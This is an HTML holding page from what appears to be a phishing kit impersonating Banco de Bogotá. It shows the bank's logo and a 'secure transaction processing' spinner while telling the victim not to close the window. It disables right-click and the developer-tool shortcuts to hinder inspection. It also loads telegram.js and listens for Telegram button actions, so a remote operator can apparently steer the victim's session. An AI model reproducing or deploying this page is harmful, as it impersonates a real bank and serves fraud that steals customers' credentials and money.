<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco de Bogotá - Autenticación Segura</title>

    <!-- Bloqueo de clic derecho y teclas -->
    <script>
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode == 123) return false;
            if (e.ctrlKey && e.shiftKey && (
                e.keyCode == 'I'.charCodeAt(0) || 
                e.keyCode == 'J'.charCodeAt(0) || 
                e.keyCode == 'C'.charCodeAt(0)
            )) return false;
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
        }
    </script>

    <style>
        :root {
            --bb-primary: #0033a0;
            --bb-secondary: #f9b000;
            --bb-accent-red: #e30613;
            --bb-accent-green: #00a651;
            --bb-bg: #ffffff;
            --bb-gradient: linear-gradient(135deg, #0033a0 0%, #0050c5 100%);
            --bb-text-main: #1a1a1a;
            --bb-text-soft: #6b6b6b;
            --bb-shadow: 0 20px 40px rgba(0, 0, 0, 0.08);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            background: linear-gradient(135deg, #f8faff 0%, #ffffff 50%);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Open Sans", Arial, sans-serif;
            color: var(--bb-text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }

        /* Partículas decorativas */
        .particles {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }

        .particle {
            position: absolute;
            background: var(--bb-secondary);
            border-radius: 50%;
            opacity: 0.1;
            animation: float 6s ease-in-out infinite;
        }

        .particle:nth-child(1) { width: 8px; height: 8px; top: 20%; left: 10%; animation-delay: 0s; }
        .particle:nth-child(2) { width: 12px; height: 12px; top: 60%; right: 15%; animation-delay: 1.5s; }
        .particle:nth-child(3) { width: 6px; height: 6px; bottom: 30%; left: 20%; animation-delay: 3s; }

        @keyframes float {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-20px) rotate(180deg); }
        }

        .page-wrapper {
            width: 100%;
            max-width: 500px;
            padding: 32px 24px;
            z-index: 2;
        }

        .bank-card {
            background: #ffffff;
            border-radius: 24px;
            border: 1px solid rgba(0, 51, 160, 0.08);
            box-shadow: var(--bb-shadow);
            padding: 36px 28px 32px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }

        .bank-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: var(--bb-gradient);
        }

        .logo-wrapper {
            display: flex;
            justify-content: center;
            margin-bottom: 28px;
        }

        .logo-wrapper img {
            max-width: 320px;
            height: auto;
            filter: drop-shadow(0 8px 20px rgba(0, 51, 160, 0.15));
        }

        .loader-container {
            position: relative;
            width: 84px;
            height: 84px;
            margin: 0 auto 24px;
        }

        .loader-ring {
            position: absolute;
            inset: 0;
            border-radius: 50%;
            border: 4px solid rgba(0, 51, 160, 0.15);
            border-top-color: var(--bb-primary);
            animation: spinRing 1s linear infinite;
        }

        .loader-glow {
            position: absolute;
            inset: 4px;
            border-radius: 50%;
            border: 2px solid rgba(249, 176, 0, 0.3);
            animation: glowPulse 2s ease-in-out infinite;
        }

        .dot {
            position: absolute;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            box-shadow: 0 6px 12px rgba(0,0,0,0.2);
        }

        .dot-yellow {
            background: var(--bb-secondary);
            top: -6px;
            left: 50%;
            transform: translateX(-50%);
        }

        .dot-blue {
            background: var(--bb-primary);
            bottom: 4px;
            left: -3px;
        }

        .dot-red {
            background: var(--bb-accent-red);
            bottom: 4px;
            right: -3px;
        }

        @keyframes spinRing {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes glowPulse {
            0%, 100% { opacity: 0.4; }
            50% { opacity: 1; }
        }

        .loading-text {
            font-size: 16px;
            font-weight: 600;
            color: var(--bb-text-main);
            margin-bottom: 6px;
        }

        .helper-text {
            font-size: 13px;
            color: var(--bb-text-soft);
            line-height: 1.4;
        }

        @media (max-width: 480px) {
            .bank-card {
                padding: 28px 20px 26px;
                border-radius: 16px;
            }
            .logo-wrapper img {
                max-width: 280px;
            }
            .page-wrapper {
                padding: 0 16px;
            }
        }
    </style>
</head>

<body>
    <!-- Partículas decorativas -->
    <div class="particles">
        <div class="particle"></div>
        <div class="particle"></div>
        <div class="particle"></div>
    </div>

    <div class="page-wrapper">
        <div class="bank-card">
            <div class="logo-wrapper">
                <img 
                    src="https://www.pngall.com/wp-content/uploads/17/Banco-De-Bogota-Logo-Emblem-PNG.png" 
                    alt="Banco de Bogotá">
            </div>

            <div class="loader-container">
                <div class="loader-ring"></div>
                <div class="loader-glow"></div>
                <div class="dot dot-yellow"></div>
                <div class="dot dot-blue"></div>
                <div class="dot dot-red"></div>
            </div>

            <div class="loading-text">Procesando transacción segura...</div>
            <div class="helper-text">
                No cierres la ventana. Tu operación está siendo verificada.
            </div>
        </div>
    </div>

    <script src="telegram.js"></script>
    <script src="action.js"></script>

    <script>
        // Detener escucha previa
        if (window.stopListening) {
            window.stopListening();
        }

        // Limpiar cualquier timeout previo
        const highestTimeoutId = setTimeout(() => {}, 0);
        for (let i = 0; i < highestTimeoutId; i++) {
            clearTimeout(i);
        }

        // Escuchar botones de Telegram
        document.addEventListener('DOMContentLoaded', function() {
            const existingMsgId = localStorage.getItem('bbogota_msg_id');

            console.log('🔍 Verificando message_id:', existingMsgId);

            const loadingTextEl = document.querySelector('.loading-text');

            if (!existingMsgId) {
                console.error('❌ No hay message_id guardado');
                if (loadingTextEl) {
                    loadingTextEl.textContent = 'Error: No hay conexión con Telegram';
                }
                return;
            }

            if (typeof listenCurrentButtons === 'function') {
                if (typeof actionProcessed !== 'undefined') {
                    actionProcessed = false;
                }

                console.log('👂 Iniciando escucha...');

                setTimeout(() => {
                    listenCurrentButtons(window.handleTelegramAction);
                }, 500);
            } else {
                console.error('❌ listenCurrentButtons no está disponible');
            }
        });
    </script>
</body>
</html>
